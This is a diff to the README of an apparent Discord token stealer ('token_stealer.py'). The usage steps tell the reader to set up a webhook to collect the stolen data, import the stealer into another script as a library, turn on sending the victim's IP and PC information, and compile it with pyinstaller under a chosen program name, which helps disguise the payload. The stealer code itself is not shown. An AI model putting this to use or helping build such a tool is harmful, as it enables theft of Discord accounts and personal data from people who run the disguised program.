@@ -16,9 +16,8 @@ This version of the grabber only supports **Windows**.
 
 # How to use
  1. Create a webhook on your Discord server.
- 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token_stealer.py](token_stealer.py)
 <br>
- 2.5. add it to another script (preferably as a library)
+ 2. add it to another script (preferably as a library)
 
 example:
 ```python
@@ -29,7 +28,7 @@ token_stealer.SEND_IP = True
 token_stealer.SEND_PC_INFO = True
 token_stealer.main()
 ```
-2.75. Compile the script using pyinstaller
+2.75. Compile the script using pyinstaller (optional but recomended)
 ```
 pyinstaller --onefile --console --name "program_name_here" --no-embed-manifest --add-data "C:/path/to/project/token_stealer.py;."  "C:/path/to/project/your_script.py"
 ```
